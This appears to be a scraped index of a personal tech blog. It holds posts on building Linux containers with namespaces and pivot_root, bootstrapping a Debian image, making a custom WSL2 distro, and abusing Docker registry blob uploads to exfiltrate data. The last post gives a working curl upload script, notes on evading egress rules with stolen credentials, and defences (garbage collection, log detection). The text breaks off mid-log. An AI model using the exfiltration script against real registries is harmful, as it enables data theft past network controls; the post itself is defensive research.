hostnameroot@localhost:/home/tamalerhino/debian# hostname containerroot@localhost:/home/tamalerhino/debian# exec bashroot@container:/home/tamalerhino/debian# We have the ability to change the internal hostname of the container without changing the host’s hostname because we gave ourselves the --uts namespace earlier.Open up a second terminal so you can check to see that your host system hostname has not changed!# Second Terminaltamalerhino@localhost:~$ hostnamelocalhostNow to fix the issue with the fact that we can kill processes, if you were to run ps from inside the container right now this is what you would see:root@container:/home/tamalerhino/debian# ps PID TTY TIME CMD10976 pts/3 00:00:00 sudo10977 pts/3 00:00:00 unshare10978 pts/3 00:00:00 bash10989 pts/3 00:00:00 psroot@container:/home/tamalerhino/debian#We dont want that! The reason we are seeing that is because when we mounted everything we also added the global /proc directory to the container. Lets only mount our debian /proc directory to our namespace as well as the --pid, and --ipc namespaces.root@container:/home/tamalerhino/debian# mount -t proc proc /procroot@container:/home/tamalerhino/debian# ps PID TTY TIME CMD 1 pts/3 00:00:00 bash 11 pts/3 00:00:00 psroot@container:/home/tamalerhino/debian#Now we can only see our processes. Another way to do this is to add the /proc mountpoint to our original unshare command ` sudo unshare –mount –uts –ipc –pid –mount-proc=/proc –fork bash`Lets go ahead and take it one step further by telling the system that our root / directory is at the debian directory, we can do this by using pivot_root. From the man page: “pivot_root() changes the root mount in the mount namespace of the calling process. More precisely, it moves the root mount to the directory put_old and makes new_root the new root mount.”First we need to create a directory where our current root filesystem will be mounted. Before you being create a file in your debian directory so you know that you are actually in your deban root directory later on like so touch /home/tamalerhino/debian/DEEEEEEBFirst we need to make a new directory close to our / root FS now.root@container:/home/tamalerhino/debian# mkdir /newrootThen we will bind mount our debian root fs to this newroot directory.root@container:/home/tamalerhino/debian# mount --bind /home/tamalerhino/debian /newrootNow we can go to the root FS and show that the newroot directory is there and our debian fs is mounted there.root@container:/home/tamalerhino/debian# cd /root@container:/# lsbin dev home lib32 libx32 media newroot proc run snap swap.img tmp varboot etc lib lib64 lost+found mnt opt root sbin srv sys usrroot@container:/# cd newroot/root@container:/newroot# lsDEEEEEEB boot etc lib lib64 media opt root sbin sys usrbin dev home lib32 libx32 mnt proc run srv tmp varNow comes the cool part we will use the command pivot_root to tell the system that our root FS is no longer the / but really now its /newroot and to treat it as such.root@container:/newroot# pivot_root . .root@container:/newroot# cd /root@container:/# lsDEEEEEEB boot etc lib lib64 media opt root sbin sys usrbin dev home lib32 libx32 mnt proc run srv tmp varSee! now everytime we use / it points to our debian FS.Now to do a little cleanupThis is a good stoping point, at this point we have a container that only sees its own processes, its own mounts and its own rootfs but we still need immutable volumes, networking and a little security. All this and much more to come in Part 2!First run the following command since mount relies on this.root@container:/# mount -t proc proc /procNow to see whats mounted. Only reason im running head is to get the first 10 lines otherwise it would be too much to render for the blog.root@container:/# mount | head/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime)udev on /dev type devtmpfs (rw,nosuid,relatime,size=1936540k,nr_inodes=484135,mode=755,inode64)devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=398444k,mode=755,inode64)tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)none on /run/credentials/systemd-sysusers.service type ramfs (ro,nosuid,nodev,noexec,relatime,mode=700)tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,nodev,noexec,relatime,size=398444k,mode=755,inode64)Go ahead and unmount everythingroot@container:/# umount -aumount: /: target is busy.... If you get errors like the one above saying something is busy just run umount -l &lt;the mount thats busy&gt; in my case umount -l /Now when we run mount we see we get a nice little isolated container mounts.root@container:/# mount/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime)proc on /proc type proc (rw,relatime)proc on /proc type proc (rw,relatime)Resources https://ericchiang.github.io/post/containers-from-scratch/ https://lwn.net/Articles/531114/ https://blog.nicolasmesa.co/posts/2018/08/container-creation-using-namespaces-and-bash/ https://www.redhat.com/sysadmin/net-namespaces https://en.wikipedia.org/wiki/Linux_namespaces https://wiki.archlinux.org/title/Linux_Containers" }, { "title": "Bootstrapping Debian as a Container Image", "url": "/posts/bootstrapping-debian-as-a-container-image-pt1/", "categories": "Containerization", "tags": "containerization, docker, linux", "date": "2021-12-12 11:00:00 -0600", "snippet": "In my research to get away from docker and docker images i needed a way to learn to create a conatiner image. After all a container image is just a filesystem that has been neatly packaged. In the docker world its just packaged using the fslayer driver, meaning it takes the artifact and cuts it up into layers for easy packaging. And when docker runs it copies all the layers as a read only artifact then adds a top writeable layer which is why you can login and add users,install packages, etc.PrereqsSince we will be creating a debian filesystem you will need a tool called debootstrap.apt install debootstrapIm also assuming you are creating this on a Debian or Ubuntu distro.Bootstrapping The FilesystemBegin by creating your directory where to put your FS.mkdir debianThen run the following commands to download and initialize that folder(replace bullseye with whatever version of debian you want).debootstrap bullseye debian/Once that is done you will get the following message:I: Base system installed successfully.At this point you have a full blown debian filesystem with all the directories needed. But its not all the way configured lets add a few files to make it easier on ourselves.Additional Configs!Apt reposFirst create the sources.list file then copy and paste the contents below into it. For a full list click herevim debian/etc/apt/sources.listdeb http://deb.debian.org/debian bullseye maindeb-src http://deb.debian.org/debian bullseye maindeb http://deb.debian.org/debian-security/ bullseye-security maindeb-src http://deb.debian.org/debian-security/ bullseye-security maindeb http://deb.debian.org/debian bullseye-updates maindeb-src http://deb.debian.org/debian bullseye-updates mainResolve.confYou will need to make sure you have propper DNS servers in your resolv.conf file otherwise you wont be able to download anything right away.If you dont know what to put just put copy and paste this into the contents of debian/etc/resolv.confnameserver 8.8.4.4nameserver 8.8.8.8 From here on out you will need to be in the FS itself so we will use chroot to do so, do not skip this step!tamalerhino@localhost:~$ sudo chroot debian/root@localhost:/#Install additional packagesIf you want install some additional packages now.apt install vim sudo curl wget ntp network-manager -ySet Locales and timezoneInstall the locales packageapt install locales -yConfigure your language and localedpkg-reconfigure localesChoose your region from the list, for US it should be en_US.UTF-8 UTF-8.Set the timzone by running the following command and choosing your Country and timezone location.dpkg-reconfigure tzdataChange the root passwordIts best if you know the root password incase you need it later, here im going to change it to debianpasswdCreate a UserYou might want to go ahead and create a non root user as well.useradd -mG sudo tamalerhinopasswd tamalerhinoHostname and hosts fileFinally if you want you can change the hostname.echo debian-bullseye &gt; /etc/hostnameAnd if you want to edit your hosts fileecho '127.0.1.1 debian-bullseye.localdomain debian-bullseye' &gt;&gt; /etc/hostsThen exit.exitPackage it up!No that you have your filesystem its time to package it up to be used later.tar -czf debian.tar.gz debian/You should end up with a 171M file which you can use to run with systemd-namespace containers or from scratch calling on chroot and namespace." }, { "title": "Creating A Custom WSL2 Image", "url": "/posts/creating-a-custom-wsl2-image/", "categories": "Containerization", "tags": "containerization, wsl, wsl2, docker, docker desktop, windows", "date": "2021-11-11 11:00:00 -0600", "snippet": "Recently with the usage of Docker Desktop, there has been a need to use WSL2 to run Docker Desktop on Windows. However because of the various security implications, missing security kernel modules, agents, etc. The idea of possibly creating or rolling our own docker solution by creating a WSL2 Linux image that we control, with all our monitoring and logging tools needed has increased. This blog will explain one possible way to do this.Docker to create a WSL2 image…for docker…WSL2 image needs a few things, a created and tar’d up filesystem as well as the binaries and everything a distro needs. One thing to mention is that the Distros that Windows uses ARE CONTAINERS, they’re System Containers not Application containers like Docker. So the simplest way to go about this in my opinion is to turn an app container into a system container!This is where docker comes in, I will use docker to create a container then I will export that container plus the filesystem and import it into WSL2 as my own distribution. This will allow us to do two things, create a golden image container(fully patched with all our customizations), and let us use the same image as a full-fledged distro, to run anything…including docker!Prerequisites  Windows System WSL2 installed and configured on that System Docker Desktop  Admin rights probably…Note: I just realized I could have done this on a Linux system and saved myself some trouble but oh well…PS C:\\Users\\tamalerhino&gt; wsl --listShould return:Download and Run the container you will want to turn into the Linux distro.In this case, I will choose RHEL since I know that it does not exist in the Microsoft store.Where it says tamalerhino-distro feels free to name it whatever you want. This doesn’t matter and it’s only to make my next command easier.PS C:\\Users\\tamalerhino&gt; docker run -d --name tamalerhino-distro registry.access.redhat.com/ubi8/ubi-initShould return:Export containerNext, let’s export the container plus the filesystem created. replace tamalerhino-distro for whatever your container name is.PS C:\\Users\\tamalerhino&gt; docker export -o tamalerhino-distro.tar.gz tamalerhino-distroShould return:Import into WSLNow we can share this or create a script in order to import it as our own distro.Where it says tamalerhino-distro , change it to what you want to name it on the system. Also, I told it to mount the distro here “./tamalerhino-distro” ideally you will want to mount it to a location you can lock down.PS C:\\Users\\tamalerhino&gt; wsl --import tamalerhino-distro ./tamalerhino-distro .\\tamalerhino-distro.tar.gzYou can use the following command to show that it created it correctly. PS C:\\Users\\tamalerhino&gt; wsl --listProfitAnd finally login to it by using the following command.PS C:\\Users\\tamalerhino&gt; wsl -d tamalerhino-distroHere I’m just showing you that its redhat.Adding StuffOne of the main issues that we have is that the docker distro isn’t locked down and the only user is the root user, let’s change thatyum update -y &amp;&amp; yum install passwd sudo -yadduser -G wheel tamalerhinoecho -e \"[user]\\ndefault=tamalerhino\" &gt;&gt; /etc/wsl.confpasswd $myUsernameYou will need to exit and terminate the running distrowsl --terminate tamalerhino-distrowsl -d tamalerhino-distroAs we can see we have defaulted to a non-root user.There now you have your very own custom Linux distro runing inside of WLS!Removing custom distroIf you want to remove the custom imported distro you will have to run the following commands, changing the name tamalerhino-distro the the name of your distro.wsl --unregister tamalerhino-distroThen you can delete any files using the Remove-Item function.Remove-Item .\\custom-wsl2\\ -Recurse" }, { "title": "How To Abuse Container Repositories For Fun And Profit", "url": "/posts/how-to-abuse-container-repositories-for-fun-and-profit/", "categories": "Containerization, Hacking", "tags": "containerization, docker, hacking, dlp, data exfiltration", "date": "2021-10-23 12:00:00 -0500", "snippet": "Often as security engineers we are worried about what vulnerabilites can be downloaded from container registries, howver i believe the same could be used to exfiltrate data.We will go over what a container repository(sometimes referred to as a registry) is, the mechanisms and APIs used to communicate with them, and ultimately how to abuse the features to make a malicious file appear like a legitimate image layer to exfiltrate data.What is a Container Repository?A container repository is a software component used to store and access container images. A container registry is a collection of container repositories, including mechanisms like authentication, authorization, and storage management. This can be simplified as a binary blob storage system with an API Frontend. It has two main processes, receiving a blob and receiving a manifest file that points to that blob. Because these processes are independent of each other you can use one or the other or both at the same time.Therein lies the first issue, because these are independent processes the registry itself does not inherently know if a blob matches to a manifest or is orphaned. That means there can be a blob ( docker container layer) that was uploaded that has no matching manifest pointing to it and will just sit there in the repo until something comes along and removes it or points to it.This means you can secretly use a container repository as a generic blob store, without your files ever showing up as a registry object.Why would you do this and how? Well, it could lead to some cool projects such as a container repository backed IRC server handled by a docker image as the client and the repo as the server, each layer being the newer messages being pushed and pulled down. And we can see other use cases such as using this tool based on the features below to store any sort of file in a repo.Blob Storage(object storage).Blob storage is really just a generic Object Storage solution but has been optimized and is ideal for storing massive amounts of unstructured data. Unstructured data is data that doesn’t adhere to a particular data model or definition, such as text or binary data.ManifestsA container manifest or an image manifest is a file that contains information about an image. Such as the layers, size, and digest of that image.Docker has built-in commands such as “docker manifest” and “docker manifest inspect” that can help manage and inspect the contents of that manifest file. To make matters worse there are two versions of a docker container manifest schema, as well as a third option called a manifest list, which is like a manifest but it includes several different manifests of other images. More info here Manifest V2 Example { \"schemaVersion\": 2, \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"config\": { \"mediaType\": \"application/vnd.docker.container.image.v1+json\", \"size\": 7023, \"digest\": \"sha256:b5b2b2c507a0944348e0303114d8d93aaaa081732b86451d9bce1f432a537bc7\" }, \"layers\": [ { \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\", \"size\": 32654, \"digest\": \"sha256:e692418e4cbaf90ca69d05a66403747baa33ee08806650b51fab815ad7fc331f\" }, { \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\", \"size\": 16724, \"digest\": \"sha256:3c3a4604a545cdc127456d94e421cd355bca5b528f4a9c1905b15da2eb4a4c6b\" }, { \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\", \"size\": 73109, \"digest\": \"sha256:ec4b8955958665577945c89419d1af06b5f7636b4ac3da7f12184802ad867736\" } ]} Manifest List Example { \"schemaVersion\": 2, \"mediaType\": \"application/vnd.docker.distribution.manifest.list.v2+json\", \"manifests\": [ { \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"size\": 7143, \"digest\": \"sha256:e692418e4cbaf90ca69d05a66403747baa33ee08806650b51fab815ad7fc331f\", \"platform\": { \"architecture\": \"ppc64le\", \"os\": \"linux\", } }, { \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"size\": 7682, \"digest\": \"sha256:5b0bcabd1ed22e9fb1310cf6c2dec7cdef19f0ad69efa1f392e94a4333501270\", \"platform\": { \"architecture\": \"amd64\", \"os\": \"linux\", \"features\": [ \"sse4\" ] } } ]}How to abuse a docker repository to exfiltrate data.So, how can we use the above knowledge to abuse the configuration?First, let’s assume that you have write-access to the repository, and while having to write access to the repository opens you up to other attacks such as the ability to overwrite images, or a backdoor to trusted images, etc the scope will be tricking the manifest to make a malicious layer or file appear as a legitimate layer of the image.Also, container repositories are not protected by default, taking a look at a tool like Shodan or googling for possible docker repositories will show many results for unprotected registries.So let’s start by using the repo itself as an exfiltration channel, given that many network tools are not able to scan for blobs or generic binary files you can actually use the docker repository to exfiltrate data. And secondly by take a look at the repo as arbitrary blog storage in order for you to deliver your malware across an entire organization.In this case, let’s assume there is a network egress policy preventing from phoning home or sending data out of the org. Many organizations do however put container registries into their allow-lists. Because these are public-facing across several environments you should be able to upload data to the registry and then download it at a different location using your credentials or stolen credentials.How to make a malicious file appear like a legitimate image layer.First let’s take a look at what the directory structure looks like for a docker repository on the filesystem, below is an example of a docker repository I made following these instructions. As an FYI I used the local storage option but there are many others to choose from S3, swift,gcs, and azure’s blob storage to name a few.This is what the repo looks like with just one image for simplicity, the more images the more blobs and repos there will be. Docker Registry Directory Structure for Ubuntu/var/lib/registry/docker/registry/v2 # ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/' #yes this looks ugly but i didnt have `tree` installed . |-blobs |---sha256 |-----58 |-------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 |-----a3 |-------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7 |-----b5 |-------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 |-----b6 |-------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e |-----da |-------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 |-----fb |-------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e |-repositories |---my-ubuntu |-----_layers |-------sha256 |---------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 |---------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 |---------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e |---------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 |---------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e |-----_manifests |-------revisions |---------sha256 |-----------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7 |-------tags |---------latest |-----------current |-----------index |-------------sha256 |---------------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7 |-----_uploads Here we can see the blobs directory, currently hosting Docker Image layers, however, keep in mind it could be absolutely any type of file. Then we have the Repositories folder which contains metadata and link references to the blobs.HOWEVER! there is no validation of any kind, the repository itself does not compare the image manifest to the blobs located in the blobs directory, and even though the docker image layers are all zip’ed files, it doesn’t even verify the file format either. There is no input validation, header validation, or file type validation, nothing.You could tell the docker registry API to upload any type of binary. As we’re about to see below. (Although there are great tools out there for working with remote image registries such as Skopeo, were just going to curl it directly that way we can run anywhere without any dependencies which makes it a perfect candidate for running on a vulnerable host.)First, let’s take a look at what the documentation says we need here:PUT /v2/&lt;name&gt;/blobs/uploads/&lt;uuid&gt;?digest=&lt;digest&gt;Content-Length: &lt;size of your content&gt;Content-Type: application/octet-stream &lt;your binary blob&gt;In order to recreate this, I wrote a bash script that would do this for me, this assumes you have a file locally called “ulises_superbad_file.txt” feel free to rename this to whatever file you want to upload.[user@docker-registry ~]$ cat ulises_superbad_file.txtTONS OF BAD STUFF IN HERE#! /bin/bashreponame=my-ubuntuuploadURL=$(curl -siL -X POST \"10.0.1.68:5000/v2/$reponame/blobs/uploads/\" | grep 'Location:' | cut -d ' ' -f 2 | tr -d '[:space:]')blobDigest=\"sha256:$(sha256sum ulises_superbad_file.txt | cut -d ' ' -f 1)\"curl -T ulises_superbad_file.txt --progress-bar \"$uploadURL&amp;digest=$blobDigest\" &gt; /dev/nullAfter running it we can see that there is a new layer in blobs! Docker Registry Directory Structure for Ubuntu showing the new layer /var/lib/registry/docker/registry/v2 # ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/' . |-blobs |---sha256 |-----46 |-------4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf # &lt;---- OUR BAD LAYER!!! |-----58 |-------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 |-----a3 |-------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7 |-----b5 |-------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 |-----b6 |-------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e |-----da |-------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 |-----fb |-------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e |---uploads |-repositories |---my-ubuntu |-----_layers |-------sha256 |---------4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf |---------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 |---------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 |---------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e |---------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 |---------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e |-----_manifests |-------revisions |---------sha256 |-----------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7 |-------tags |---------latest |-----------current |-----------index |-------------sha256 |---------------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7 |-----_uploads |-------69c54205-5f65-4319-8f73-ae3868970f75 |---------hashstates |-----------sha256 |-------b3e5b11b-a3aa-4cd4-8730-4ae9b11cc4e4 |---------hashstates |-----------sha256 |-------e7adae40-331d-4532-8c35-516a8a5f698e |---------hashstates |-----------sha256 Catting out that file will show that we have successfully exfiltrated using the docker registry API! And as you can see we did not overwrite any layer or repo, just adding to where the blob gets stored./var/lib/registry/docker/registry/v2 # cat blobs/sha256/46/4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf/dataTONS OF BAD STUFF IN HEREIn the above example, I put it into my my-ubuntu repo, ideally, you could replace this with any repo name, the more common the better.To find out what repos exists just run the following and you will get back the list of repositories in the registry.[user@docker-registry ~]$ curl -X GET 10.0.1.68:5000/v2/_catalog{\"repositories\":[\"my-ubuntu\"]}Defending Against the Dark ArtsSo how can we defend against this type of attack? It starts with proper authorization, this type of attack is only possible because the user would have access to write to any repo in the registry.However, there are two main things we can do to defend against this if our authorization controls were to fail.Garbage CollectionGarbage collection is the biggest control we can add here. What garbage collection does is, remove blobs from the filesystem when they are no longer referenced by a manifest. As of v2.4.0, a garbage collector command is included within the registry binary. Garbage collection runs in two phases. First, in the ‘mark’ phase, the process scans all the manifests in the registry. From these manifests, it constructs a set of content address digests. This set is the ‘mark set’ and denotes the set of blobs to not delete. Secondly, in the ‘sweep’ phase, the process scans all the blobs and if a blob’s content address digest is not in the mark set, the process deletes it. One caveat with this is that you should ensure that the registry is in read-only mode or not running at all. If you were to upload an image while garbage collection is running, there is the risk that the image’s layers are mistakenly deleted leading to a corrupted image.To run the garbage collection binary, you would run it as follows(ideally in some sort of cron or automated way), the dry-run option can be used to see what will be deleted. And you will need a yml file that tells it what registry to look into.bin/registry garbage-collect [--dry-run] /path/to/config.yml To find your rootdirectory for your yaml file run this # cat /etc/docker/registry/config.ymlversion: 0.1log: fields: service: registrystorage: cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registryhttp: addr: :5000 headers: X-Content-Type-Options: [nosniff]health: storagedriver: enabled: true interval: 10s threshold: 3 deletebadstuff.yml version: 0.1storage: filesystem: rootdirectory: /var/lib/registry Here we ran the command and found the blob I uploaded and removed it./etc/docker/registry # registry garbage-collect /etc/docker/registry/deletebadstuff.ymlmy-ubuntumy-ubuntu: marking manifest sha256:a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7my-ubuntu: marking blob sha256:b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2emy-ubuntu: marking blob sha256:58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50my-ubuntu: marking blob sha256:b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01my-ubuntu: marking blob sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1my-ubuntu: marking blob sha256:fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e 6 blobs marked, 1 blobs and 0 manifests eligible for deletionblob eligible for deletion: sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbfINFO[0000] Deleting blob: /docker/registry/v2/blobs/sha256/46/4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf go.version=go1.11.2 instance.id=7ae297a0-9007-45a9-95c8-1d7e83dcc634Many modern containerization registries come with some sort of garbage collecting by default such as Azure’s Container Registry, GitLab’s Container Registry, and Harbor. However most of the time these features are not turned on by default.LoggingBecause we are using the API legitimately, that means that we are able to see all the API calls in the logs, as you can see below this is what regular traffic looks like many calls with GET, HEAD, and POST methods.192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] \"GET /v2/ HTTP/1.1\" 200 2 \"\" \"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\\\(linux\\\\))\"time=\"2021-10-22T22:34:59.838542408Z\" level=error msg=\"response completed with error\" err.code=\"blob unknown\" err.detail=sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 err.message=\"blob unknown to registry\" go.version=go1.11.2 http.request.host=\"localhost:5000\" http.request.id=c6748305-21fd-4bad-a5bc-f76f58dfa078 http.request.method=HEAD http.request.remoteaddr=\"192.168.40.1:60128\" http.request.uri=\"/v2/my-ubuntu/blobs/sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\" http.request.useragent=\"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))\" http.response.contenttype=\"application/json; charset=utf-8\" http.response.duration=6.09934ms http.response.status=404 http.response.written=157 vars.digest=\"sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\" vars.name=my-ubuntu192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] \"HEAD /v2/my-ubuntu/blobs/sha256:b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 HTTP/1.1\" 404 157 \"\" \"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\\\(linux\\\\))\"192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] \"HEAD /v2/my-ubuntu/blobs/sha256:fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e HTTP/1.1\" 404 157 \"\" \"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\\\(linux\\\\))\"192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] \"HEAD /v2/my-ubuntu/blobs/sha256:58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 HTTP/1.1\" 404 157 \"\" \"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\\\(linux\\\\))\"time=\"2021-10-22T22:34:59.862855296Z\" level=info msg=\"response completed\" go.version=go1.11.2 http.request.host=\"localhost:5000\" http.request.id=90bcd815-28e4-4b10-88eb-7776c67cf385 http.request.method=POST http.request.remoteaddr=\"192.168.40.1:60136\" http.request.uri=\"/v2/my-ubuntu/blobs/uploads/\" http.request.useragent=\"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))\" http.response.duration=27.498841ms http.response.status=202 http.response.written=0192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] \"HEAD /v2/my-ubuntu/blobs/sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 HTTP/1.1\" 404 157 \"\" \"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\\\(linux\\\\))\"192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] \"POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1\" 202 0 \"\" \"docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\\\(linux\\\\))\"Here where we are uploading my blob through the API you can see that it’s mostly POST and PUTS, with no HEAD or GETS methods. We should be able to train our SIEM to look for this sort of pattern and alert us when this happens.10.0.1.68 - - [23/Oct/2021:02:35:14 +0000] \"POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1\" 202 0 \"\" \"curl/7.68.0\"time=\"2021-10-23T02:35:14.697725865Z\" level=error msg=\"response completed with error\" err.code=\"digest invalid\" err.detail=\"digest parsing failed\" err.message=\"provided digest did not match uploaded content\" go.version=go1.11.2 http.request.host=\"10.0.1.68:5000\" http.request.id=c1b2df8e-2235-474e-a8ae-a4e9b0144366 http.request.method=PUT http.request.remoteaddr=\"10.0.1.68:46056\" http.request.uri=\"/v2/my-ubuntu/blobs/uploads/69c54205-5f65-4319-8f73-ae3868970f75?_state=IAwESRbw7yI8SSgXKwXcC8acbxyao7VYfyzJGk_vFgZ7Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiNjljNTQyMDUtNWY2NS00MzE5LThmNzMtYWUzODY4OTcwZjc1IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM1OjE0LjY2OTU3OTQwMloifQ%3D%3D&amp;digest=4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf\" http.request.useragent=\"curl/7.68.0\" http.response.contenttype=\"application/json; charset=utf-8\" http.response.duration=4.274777ms http.response.status=400 http.response.written=131 vars.name=my-ubuntu vars.uuid=69c54205-5f65-4319-8f73-ae3868970f7510.0.1.68 - - [23/Oct/2021:02:35:14 +0000] \"PUT /v2/my-ubuntu/blobs/uploads/69c54205-5f65-4319-8f73-ae3868970f75?_state=IAwESRbw7yI8SSgXKwXcC8acbxyao7VYfyzJGk_vFgZ7Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiNjljNTQyMDUtNWY2NS00MzE5LThmNzMtYWUzODY4OTcwZjc1IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM1OjE0LjY2OTU3OTQwMloifQ%3D%3D&amp;digest=4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf HTTP/1.1\" 400 131 \"\" \"curl/7.68.0\"10.0.1.68 - - [23/Oct/2021:02:37:56 +0000] \"POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1\" 202 0 \"\" \"curl/7.68.0\"time=\"2021-10-23T02:37:56.666705903Z\" level=info msg=\"response completed\" go.version=go1.11.2 http.request.host=\"10.0.1.68:5000\" http.request.id=4f5d3d80-7239-4b49-ba04-dc99cce91017 http.request.method=POST http.request.remoteaddr=\"10.0.1.68:46058\" http.request.uri=\"/v2/my-ubuntu/blobs/uploads/\" http.request.useragent=\"curl/7.68.0\" http.response.duration=5.900598ms http.response.status=202 http.response.written=010.0.1.68 